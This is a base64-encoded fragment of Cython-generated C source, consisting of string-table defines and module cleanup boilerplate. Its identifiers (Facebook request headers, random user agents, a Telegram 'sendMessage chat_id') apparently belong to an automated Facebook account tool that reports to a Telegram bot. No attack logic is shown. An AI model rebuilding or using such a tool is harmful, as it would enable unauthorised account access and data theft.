5eF9zdHJpbmdfdGFiWzI3NF0KI2RlZmluZSBfX3B5eF9uX3Vfb3MgX19weXhfc3RyaW5nX3RhYlsyNzVdCiNkZWZpbmUgX19weXhfbl91X291dHB1dCBfX3B5eF9zdHJpbmdfdGFiWzI3Nl0KI2RlZmluZSBfX3B5eF9uX3Vfb3cgX19weXhfc3RyaW5nX3RhYlsyNzddCiNkZWZpbmUgX19weXhfbl91X3BhcmFtcyBfX3B5eF9zdHJpbmdfdGFiWzI3OF0KI2RlZmluZSBfX3B5eF9rcF91X3BpcF9pbnN0YWxsX2JzNCBfX3B5eF9zdHJpbmdfdGFiWzI3OV0KI2RlZmluZSBfX3B5eF9rcF91X3BpcF9pbnN0YWxsX2NvbG9yYW1hIF9fcHl4X3N0cmluZ190YWJbMjgwXQojZGVmaW5lIF9fcHl4X2twX3VfcGlwX2luc3RhbGxfaGFzaGxpYiBfX3B5eF9zdHJpbmdfdGFiWzI4MV0KI2RlZmluZSBfX3B5eF9rcF91X3BpcF9pbnN0YWxsX2pzb24gX19weXhfc3RyaW5nX3RhYlsyODJdCiNkZWZpbmUgX19weXhfa3BfdV9waXBfaW5zdGFsbF9weXRob25fY2ZvbnRzIF9fcHl4X3N0cmluZ190YWJbMjgzXQojZGVmaW5lIF9fcHl4X2twX3VfcGlwX2luc3RhbGxfcmFuZG9tIF9fcHl4X3N0cmluZ190YWJbMjg0XQojZGVmaW5lIF9fcHl4X2twX3VfcGlwX2luc3RhbGxfcmUgX19weXhfc3RyaW5nX3RhYlsyODVdCiNkZWZpbmUgX19weXhfa3BfdV9waXBfaW5zdGFsbF9yZXF1ZXN0cyBfX3B5eF9zdHJpbmdfdGFiWzI4Nl0KI2RlZmluZSBfX3B5eF9rcF91X3BpcF9pbnN0YWxsX3JpY2ggX19weXhfc3RyaW5nX3RhYlsyODddCiNkZWZpbmUgX19weXhfa3BfdV9waXBfaW5zdGFsbF90aHJlYWRpbmcgX19weXhfc3RyaW5nX3RhYlsyODhdCiNkZWZpbmUgX19weXhfa3BfdV9waXBfaW5zdGFsbF90aW1lIF9fcHl4X3N0cmluZ190YWJbMjg5XQojZGVmaW5lIF9fcHl4X2twX3VfcGlwX2luc3RhbGxfdXNlcl9hZ2VudCBfX3B5eF9zdHJpbmdfdGFiWzI5MF0KI2RlZmluZSBfX3B5eF9rcF91X3BpcF9pbnN0YWxsX3V1aWQgX19weXhfc3RyaW5nX3RhYlsyOTFdCiNkZWZpbmUgX19weXhfbl91X3BrIF9fcHl4X3N0cmluZ190YWJbMjkyXQojZGVmaW5lIF9fcHl4X25fdV9wb3AgX19weXhfc3RyaW5nX3RhYlsyOTNdCiNkZWZpbmUgX19weXhfbl91X3Bvc3QgX19weXhfc3RyaW5nX3RhYlsyOTRdCiNkZWZpbmUgX19weXhfbl91X3BwIF9fcHl4X3N0cmluZ190YWJbMjk1XQojZGVmaW5lIF9fcHl4X25fdV9wcHBwIF9fcHl4X3N0cmluZ190YWJbMjk2XQojZGVmaW5lIF9fcHl4X25fdV9wcmludCBfX3B5eF9zdHJpbmdfdGFiWzI5N10KI2RlZmluZSBfX3B5eF9uX3VfcHJpbnRpbmcgX19weXhfc3RyaW5nX3RhYlsyOThdCiNkZWZpbmUgX19weXhfbl91X3ByaW9yaXR5IF9fcHl4X3N0cmluZ190YWJbMjk5XQojZGVmaW5lIF9fcHl4X2twX3VfcWNvbV9lbl9VU181NDU5ODYgX19weXhfc3RyaW5nX3RhYlszMDBdCiNkZWZpbmUgX19weXhfbl91X3F1YWxuYW1lIF9fcHl4X3N0cmluZ190YWJbMzAxXQojZGVmaW5lIF9fcHl4X25fdV9xdWVyeSBfX3B5eF9zdHJpbmdfdGFiWzMwMl0KI2RlZmluZSBfX3B5eF9uX3VfciBfX3B5eF9zdHJpbmdfdGFiWzMwM10KI2RlZmluZSBfX3B5eF9uX3VfcmFuZF9pZHMgX19weXhfc3RyaW5nX3RhYlszMDRdCiNkZWZpbmUgX19weXhfbl91X3JhbmRpbnQgX19weXhfc3RyaW5nX3RhYlszMDVdCiNkZWZpbmUgX19weXhfbl91X3JhbmRvbSBfX3B5eF9zdHJpbmdfdGFiWzMwNl0KI2RlZmluZSBfX3B5eF9uX3VfcmFuZHJhbmdlIF9fcHl4X3N0cmluZ190YWJbMzA3XQojZGVmaW5lIF9fcHl4X25fdV9yYW5nZSBfX3B5eF9zdHJpbmdfdGFiWzMwOF0KI2RlZmluZSBfX3B5eF9uX3VfcmUgX19weXhfc3RyaW5nX3RhYlszMDldCiNkZWZpbmUgX19weXhfbl91X3JlYWQgX19weXhfc3RyaW5nX3RhYlszMTBdCiNkZWZpbmUgX19weXhfbl91X3JlZmVyZXIgX19weXhfc3RyaW5nX3RhYlszMTFdCiNkZWZpbmUgX19weXhfbl91X3JlbmRlciBfX3B5eF9zdHJpbmdfdGFiWzMxMl0KI2RlZmluZSBfX3B5eF9uX3VfcmVxdWVzdHMgX19weXhfc3RyaW5nX3RhYlszMTNdCiNkZWZpbmUgX19weXhfbl91X3JlczEgX19weXhfc3RyaW5nX3RhYlszMTRdCiNkZWZpbmUgX19weXhfbl91X3Jlc3BvbnNlIF9fcHl4X3N0cmluZ190YWJbMzE1XQojZGVmaW5lIF9fcHl4X25fdV9yZXN0IF9fcHl4X3N0cmluZ190YWJbMzE2XQojZGVmaW5lIF9fcHl4X25fdV9yaWNoX2NvbnNvbGUgX19weXhfc3RyaW5nX3RhYlszMTddCiNkZWZpbmUgX19weXhfbl91X3JpY2hfcGFuZWwgX19weXhfc3RyaW5nX3RhYlszMThdCiNkZWZpbmUgX19weXhfbl91X3JuZCBfX3B5eF9zdHJpbmdfdGFiWzMxOV0KI2RlZmluZSBfX3B5eF9uX3VfcnIgX19weXhfc3RyaW5nX3RhYlszMjBdCiNkZWZpbmUgX19weXhfbl91X3NlYXJjaCBfX3B5eF9zdHJpbmdfdGFiWzMyMV0KI2RlZmluZSBfX3B5eF9uX3Vfc2VuZCBfX3B5eF9zdHJpbmdfdGFiWzMyMl0KI2RlZmluZSBfX3B5eF9rcF91X3NlbmRNZXNzYWdlX2NoYXRfaWQgX19weXhfc3RyaW5nX3RhYlszMjNdCiNkZWZpbmUgX19weXhfbl91X3NlcnZlcl90aW1lc3RhbXBzIF9fcHl4X3N0cmluZ190YWJbMzI0XQojZGVmaW5lIF9fcHl4X25fdV9zZXRfbmFtZSBfX3B5eF9zdHJpbmdfdGFiWzMyNV0KI2RlZmluZSBfX3B5eF9uX3Vfc2lnbmVkX2JvZHkgX19weXhfc3RyaW5nX3RhYlszMjZdCiNkZWZpbmUgX19weXhfbl91X3NsZWVwIF9fcHl4X3N0cmluZ190YWJbMzI3XQojZGVmaW5lIF9fcHl4X25fdV9zcGFjZSBfX3B5eF9zdHJpbmdfdGFiWzMyOF0KI2RlZmluZSBfX3B5eF9uX3Vfc3BlYyBfX3B5eF9zdHJpbmdfdGFiWzMyOV0KI2RlZmluZSBfX3B5eF9uX3Vfc3BsaXQgX19weXhfc3RyaW5nX3RhYlszMzBdCiNkZWZpbmUgX19weXhfbl91X3NwbGl0bGluZXMgX19weXhfc3RyaW5nX3RhYlszMzFdCiNkZWZpbmUgX19weXhfbl91X3NzIF9fcHl4X3N0cmluZ190YWJbMzMyXQojZGVmaW5lIF9fcHl4X25fdV9zdGFydCBfX3B5eF9zdHJpbmdfdGFiWzMzM10KI2RlZmluZSBfX3B5eF9uX3Vfc3Rkb3V0IF9fcHl4X3N0cmluZ190YWJbMzM0XQojZGVmaW5lIF9fcHl4X25fdV9zdWJwcm9jZXNzIF9fcHl4X3N0cmluZ190YWJbMzM1XQojZGVmaW5lIF9fcHl4X25fdV9zeXMgX19weXhfc3RyaW5nX3RhYlszMzZdCiNkZWZpbmUgX19weXhfbl91X3N5c3RlbSBfX3B5eF9zdHJpbmdfdGFiWzMzN10KI2RlZmluZSBfX3B5eF9uX3VfdCBfX3B5eF9zdHJpbmdfdGFiWzMzOF0KI2RlZmluZSBfX3B5eF9uX3VfdGFyZ2V0IF9fcHl4X3N0cmluZ190YWJbMzM5XQojZGVmaW5lIF9fcHl4X25fdV90ZXN0IF9fcHl4X3N0cmluZ190YWJbMzQwXQojZGVmaW5lIF9fcHl4X25fdV90ZXh0IF9fcHl4X3N0cmluZ190YWJbMzQxXQojZGVmaW5lIF9fcHl4X2twX3VfdGV4dF8yIF9fcHl4X3N0cmluZ190YWJbMzQyXQojZGVmaW5lIF9fcHl4X25fdV90aHJlYWRpbmcgX19weXhfc3RyaW5nX3RhYlszNDNdCiNkZWZpbmUgX19weXhfbl91X3RocmVhZHMgX19weXhfc3RyaW5nX3RhYlszNDRdCiNkZWZpbmUgX19weXhfbl91X3Rocm93IF9fcHl4X3N0cmluZ190YWJbMzQ1XQojZGVmaW5lIF9fcHl4X25fdV90aW1lIF9fcHl4X3N0cmluZ190YWJbMzQ2XQojZGVmaW5lIF9fcHl4X25fdV90bCBfX3B5eF9zdHJpbmdfdGFiWzM0N10KI2RlZmluZSBfX3B5eF9rcF91X3RsX3R4dCBfX3B5eF9zdHJpbmdfdGFiWzM0OF0KI2RlZmluZSBfX3B5eF9uX3VfdGxsIF9fcHl4X3N0cmluZ190YWJbMzQ5XQojZGVmaW5lIF9fcHl4X25fdV90bGxfbG9jYWxzX2dlbmV4cHIgX19weXhfc3RyaW5nX3RhYlszNTBdCiNkZWZpbmUgX19weXhfbl91X3RvayBfX3B5eF9zdHJpbmdfdGFiWzM1MV0KI2RlZmluZSBfX3B5eF9uX3VfdG90YWwgX19weXhfc3RyaW5nX3RhYlszNTJdCiNkZWZpbmUgX19weXhfbl91X3RydWUgX19weXhfc3RyaW5nX3RhYlszNTNdCiNkZWZpbmUgX19weXhfa3BfdV91XzFfaSBfX3B5eF9zdHJpbmdfdGFiWzM1NF0KI2RlZmluZSBfX3B5eF9uX3VfdWEgX19weXhfc3RyaW5nX3RhYlszNTVdCiNkZWZpbmUgX19weXhfbl91X3VpZCBfX3B5eF9zdHJpbmdfdGFiWzM1Nl0KI2RlZmluZSBfX3B5eF9uX3VfdXNlciBfX3B5eF9zdHJpbmdfdGFiWzM1N10KI2RlZmluZSBfX3B5eF9rcF91X3VzZXJJRCBfX3B5eF9zdHJpbmdfdGFiWzM1OF0KI2RlZmluZSBfX3B5eF9rcF91X3VzZXJfYWdlbnQgX19weXhfc3RyaW5nX3RhYlszNTldCiNkZWZpbmUgX19weXhfbl91X3VzZXJfYWdlbnRfMiBfX3B5eF9zdHJpbmdfdGFiWzM2MF0KI2RlZmluZSBfX3B5eF9uX3VfdXNlcm5hbWUgX19weXhfc3RyaW5nX3RhYlszNjFdCiNkZWZpbmUgX19weXhfa3BfdV91c2VybmFtZV9jcmlzdGlhbm8gX19weXhfc3RyaW5nX3RhYlszNjJdCiNkZWZpbmUgX19weXhfa3BfdV91dGZfOCBfX3B5eF9zdHJpbmdfdGFiWzM2M10KI2RlZmluZSBfX3B5eF9uX3VfdXRpbCBfX3B5eF9zdHJpbmdfdGFiWzM2NF0KI2RlZmluZSBfX3B5eF9uX3VfdXVpIF9fcHl4X3N0cmluZ190YWJbMzY1XQojZGVmaW5lIF9fcHl4X25fdV91dWlkIF9fcHl4X3N0cmluZ190YWJbMzY2XQojZGVmaW5lIF9fcHl4X25fdV91dWlkNCBfX3B5eF9zdHJpbmdfdGFiWzM2N10KI2RlZmluZSBfX3B5eF9uX3VfdXV1IF9fcHl4X3N0cmluZ190YWJbMzY4XQojZGVmaW5lIF9fcHl4X25fdV91dXVfbG9jYWxzX2dlbmV4cHIgX19weXhfc3RyaW5nX3RhYlszNjldCiNkZWZpbmUgX19weXhfbl91X3ZhbHVlIF9fcHl4X3N0cmluZ190YWJbMzcwXQojZGVmaW5lIF9fcHl4X25fdV92YXJpYWJsZXMgX19weXhfc3RyaW5nX3RhYlszNzFdCiNkZWZpbmUgX19weXhfbl91X3cgX19weXhfc3RyaW5nX3RhYlszNzJdCiNkZWZpbmUgX19weXhfbl91X3dlYmJyb3dzZXIgX19weXhfc3RyaW5nX3RhYlszNzNdCiNkZWZpbmUgX19weXhfbl91X3dyaXRlIF9fcHl4X3N0cmluZ190YWJbMzc0XQojZGVmaW5lIF9fcHl4X25fdV94IF9fcHl4X3N0cmluZ190YWJbMzc1XQojZGVmaW5lIF9fcHl4X2twX3VfeF9mYl9mcmllbmRseV9uYW1lIF9fcHl4X3N0cmluZ190YWJbMzc2XQojZGVmaW5lIF9fcHl4X2twX3VfeF9mYl9sc2QgX19weXhfc3RyaW5nX3RhYlszNzddCiNkZWZpbmUgX19weXhfbl91X3llbGxvdyBfX3B5eF9zdHJpbmdfdGFiWzM3OF0KI2RlZmluZSBfX3B5eF9uX3VfeXkgX19weXhfc3RyaW5nX3RhYlszNzldCgojaWYgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUKc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX3B5eF9tX2NsZWFyKFB5T2JqZWN0ICptKSB7CiAgX19weXhfbXN0YXRldHlwZSAqY2xlYXJfbW9kdWxlX3N0YXRlID0gX19QeXhfUHlNb2R1bGVfR2V0U3RhdGUobSk7CiAgaWYgKCFjbGVhcl9tb2R1bGVfc3RhdGUpIHJldHVybiAwOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfZCk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9iKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2N5dGhvbl9ydW50aW1lKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2VtcHR5X3R1cGxlKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2VtcHR5X2J5dGVzKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOwogICNpZmRlZiBfX1B5eF9DeUZ1bmN0aW9uX1VTRUQKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X0N5RnVuY3Rpb25UeXBlKTsKICAjZW5kaWYKICAjaWZkZWYgX19QeXhfRnVzZWRGdW5jdGlvbl9VU0VECiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9GdXNlZEZ1bmN0aW9uVHlwZSk7CiAgI2VuZGlmCiAgI2lmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVAogIF9fUHl4X1N0YXRlX1JlbW92ZU1vZHVsZShOVUxMKTsKICAjZW5kaWYKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3B0eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3B0eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3R5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfcHR5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcik7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9wdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcik7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF90eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByKTsKICBmb3IgKGludCBpPTA7IGk8MTsgKytpKSB7IFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfc2xpY2VbaV0pOyB9CiAgZm9yIChpbnQgaT0wOyBpPDI0OyArK2kpIHsgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF90dXBsZVtpXSk7IH0KICBmb3IgKGludCBpPTA7IGk8MTU7ICsraSkgeyBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2NvZGVvYmpfdGFiW2ldKTsgfQogIGZvciAoaW50IGk9MDsgaTwzODA7ICsraSkgeyBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3N0cmluZ190YWJbaV0pOyB9CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMCk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMSk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMik7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMyk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfNSk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfNik7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfOSk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTApOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzExKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xNSk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTYpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzMwKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMDApOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzExMSk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTUwKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDApOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzIwOCk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfOTk5KTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMDAwKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMzAwKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDAwKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDEwKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDExKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDEyKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDEzKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE0KTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE1KTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE2KTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE3KTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE4KTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE5KTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMDAwMDAwKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMjc5MDAwKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMjc5MDAxKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xNzc1MDAwMCk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTc3NTAwMDEpOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzI3OTc2MDAwMCk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjc5NzYwMDAxKTsKICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF85MDA5OTAwMDApOwogIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzkwMDk5MDAwMSk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTYyOTAxMDAwMCk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTkwMDAwMDAwMCk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjUwMDAwMDAwMCk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMzcxMzY2ODc4Nik7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfNTY5OTc4NTIxNyk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfODUwNzk0MDYzNCk7CiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjEyNTQwMjk4MzQpOwogIHJldHVybiAwOwp9CiNlbmRpZgoKI2lmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFCnN0YXRpYyBDWVRIT05fU01BTExfQ09ERSBpbnQgX19weXhfbV90cmF2ZXJzZShQeU9iamVjdCAqbSwgdmlzaXRwcm9jIHZpc2l0LCB2b2lkICphcmcpIHsKICBfX3B5eF9tc3RhdGV0eXBlICp0cmF2ZXJzZV9tb2R1bGVfc3RhdGUgPSBfX1B5eF9QeU1vZHVsZV9HZXRTdGF0ZShtKTsKICBpZiAoIXRyYXZlcnNlX21vZHVsZV9zdGF0ZSkgcmV0dXJuIDA7CiAgUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9kKTsKICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2IpOwogIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfY3l0aG9uX3J1bnRpbWUpOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfZW1wdHlfdHVwbGUpOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfZW1wdHlfYnl0ZXMpOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfZW1wdHlfdW5pY29kZSk7CiAgI2lmZGVmIF9fUHl4X0N5RnVuY3Rpb25fVVNFRAogIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfQ3lGdW5jdGlvblR5cGUpOwogICNlbmRpZgogICNpZmRlZiBfX1B5eF9GdXNlZEZ1bmN0aW9uX1VTRUQKICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X0Z1c2VkRnVuY3Rpb25UeXBlKTsKICAjZW5kaWYKICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3B0eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfX2dlbmV4cHIpOwogIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKTsKICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3B0eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKTsKICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3R5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8xX2dlbmV4cHIpOwogIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfcHR5cGVfMm5lX19fcHl4X3Njb3BlX3N0cnVjdF8yX2dlbmV4cHIpOwogIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcik7CiAgUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9wdHlwZV8ybmVfX19weXhfc2NvcGVfc3RydWN0XzNfZ2VuZXhwcik7CiAgUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF90eXBlXzJuZV9fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByKTsKICBmb3IgKGludCBpPTA7IGk8MTsgKytpKSB7IF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfc2xpY2VbaV0pOyB9CiAgZm9yIChpbnQgaT0wOyBpPDI0OyArK2kpIHsgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF90dXBsZVtpXSk7IH0KICBmb3IgKGludCBpPTA7IGk8MTU7ICsraSkgeyBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2NvZGVvYmpfdGFiW2ldKTsgfQogIGZvciAoaW50IGk9MDsgaTwzODA7ICsraSkgeyBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3N0cmluZ190YWJbaV0pOyB9CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMCk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMSk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMik7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMyk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfNSk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfNik7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfOSk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTApOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzExKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xNSk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTYpOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzMwKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMDApOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzExMSk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlL